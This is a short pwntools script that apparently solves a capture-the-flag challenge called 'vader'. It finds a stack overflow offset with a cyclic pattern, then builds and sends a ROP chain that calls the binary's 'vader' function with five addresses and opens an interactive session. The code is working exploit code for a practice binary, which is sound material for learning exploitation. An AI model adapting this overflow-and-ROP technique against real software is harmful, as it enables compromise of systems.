from pwn import *

def find_offset(p):
    p.sendline(cyclic(500, n=8))
    p.wait()
    core = p.corefile
    print(cyclic_find(core.read(core.rsp, 8), n=8))
elf=ELF("./vader")
context.arch=elf.arch

#context.log_level="debug"
p=elf.process()
#p=remote("host",port)
rop=ROP(elf)
rop.raw('a'*40)
rop.vader(0x402ec9,0x402ece,0x402ed3,0x402ed6,0x402eda)
print(rop.dump())
p.recvuntil(b"When I left you, I was but the learner. Now I am the master >>> ")
p.sendline(rop.chain())
p.interactive()
